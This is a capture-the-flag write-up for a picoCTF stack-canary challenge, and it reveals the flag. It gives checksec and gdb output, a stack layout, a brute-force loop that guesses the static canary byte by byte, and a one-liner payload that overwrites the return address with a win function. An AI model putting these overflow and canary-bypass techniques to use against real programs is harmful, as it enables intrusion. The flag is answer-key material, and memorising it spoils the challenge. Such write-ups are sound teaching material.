# Exp

# Flag: picoCTF{Stat1C_c4n4r13s_4R3_b4D_10a64ab3}

Do you think you can bypass the protection and get the flag? It looks like Dr. Oswal added a stack canary to this program to protect against buffer overflows.

file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5fadb3d053aee24d87bef67c56037d6d9e2b56f2, for GNU/Linux 3.2.0, not stripped

checksec vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

# Crashing the program
./vuln
How Many Bytes will You Write Into the Buffer?
> 65
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
***** Stack Smashing Detected ***** : Canary Value Corrupt!

Sending 65 A crashes the vuln binary

## Gather important information
win function address 0x08049336


gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x08049461 <+0>:     endbr32
   0x08049465 <+4>:     push   ebp
   0x08049466 <+5>:     mov    ebp,esp
   0x08049468 <+7>:     push   ebx
   0x08049469 <+8>:     sub    esp,0x94
   0x0804946f <+14>:    call   0x8049270 <__x86.get_pc_thunk.bx>
   0x08049474 <+19>:    add    ebx,0x2b8c
   0x0804947a <+25>:    mov    DWORD PTR [ebp-0xc],0x0              ;*** int x = 0
   0x08049481 <+32>:    mov    eax,0x804c054
   0x08049487 <+38>:    mov    eax,DWORD PTR [eax]
   0x08049489 <+40>:    mov    DWORD PTR [ebp-0x10],eax             ;*** memcpy(canary,global_canary,CANARY_SIZE);
   0x0804948c <+43>:    sub    esp,0xc
   0x0804948f <+46>:    lea    eax,[ebx-0x1f40]
   0x08049495 <+52>:    push   eax
   0x08049496 <+53>:    call   0x8049140 <printf@plt>
   0x0804949b <+58>:    add    esp,0x10
   0x0804949e <+61>:    jmp    0x80494d1 <vuln+112>
   0x080494a0 <+63>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080494a3 <+66>:    lea    edx,[ebp-0x90]
   0x080494a9 <+72>:    add    eax,edx
   0x080494ab <+74>:    sub    esp,0x4
   0x080494ae <+77>:    push   0x1
   0x080494b0 <+79>:    push   eax
   0x080494b1 <+80>:    push   0x0
   0x080494b3 <+82>:    call   0x8049130 <read@plt>
   0x080494b8 <+87>:    add    esp,0x10
   0x080494bb <+90>:    lea    edx,[ebp-0x90]
   0x080494c1 <+96>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080494c4 <+99>:    add    eax,edx
   0x080494c6 <+101>:   movzx  eax,BYTE PTR [eax]
   0x080494c9 <+104>:   cmp    al,0xa
   0x080494cb <+106>:   je     0x80494d9 <vuln+120>
   0x080494cd <+108>:   add    DWORD PTR [ebp-0xc],0x1
   0x080494d1 <+112>:   cmp    DWORD PTR [ebp-0xc],0x3f
   0x080494d5 <+116>:   jle    0x80494a0 <vuln+63>
   0x080494d7 <+118>:   jmp    0x80494da <vuln+121>
   0x080494d9 <+120>:   nop
   0x080494da <+121>:   sub    esp,0x4
   0x080494dd <+124>:   lea    eax,[ebp-0x94]
   0x080494e3 <+130>:   push   eax
   0x080494e4 <+131>:   lea    eax,[ebx-0x1f0e]
   0x080494ea <+137>:   push   eax
   0x080494eb <+138>:   lea    eax,[ebp-0x90]
   0x080494f1 <+144>:   push   eax
   0x080494f2 <+145>:   call   0x80491e0 <__isoc99_sscanf@plt>
   0x080494f7 <+150>:   add    esp,0x10
   0x080494fa <+153>:   sub    esp,0xc
   0x080494fd <+156>:   lea    eax,[ebx-0x1f0b]
   0x08049503 <+162>:   push   eax
   0x08049504 <+163>:   call   0x8049140 <printf@plt>
   0x08049509 <+168>:   add    esp,0x10
   0x0804950c <+171>:   mov    eax,DWORD PTR [ebp-0x94]
   0x08049512 <+177>:   sub    esp,0x4
   0x08049515 <+180>:   push   eax
   0x08049516 <+181>:   lea    eax,[ebp-0x50]                         ;*** buf
   0x08049519 <+184>:   push   eax
   0x0804951a <+185>:   push   0x0
   0x0804951c <+187>:   call   0x8049130 <read@plt>                   ;*** read(0,buf,count);

buf is at ebp-0x50
canary is at ebp-0x10
buf is 64 bytes long

buf[64] ---> canaray[4] ---> padding[??] ---> <ebp> ---> <return address>

So if we write a script that sends 65 chars it will override the first canary byte. If no error, it means the byte is correct

```
for i in {0..255}; do python -c "print(\"65\\n\" + \"U\"*64 + chr($i))" | ./vuln >/dev/null && echo "$i"; done
```
or  `python guess_canary.py SILENT=1`

### Run remotely and the canary word is: BiRd


python -c "print(\"84\\n\" + \"A\"*64 + "BiRd" + "B" * 12 + \"\\x36\\x93\\x04\\x08\")" | ./vuln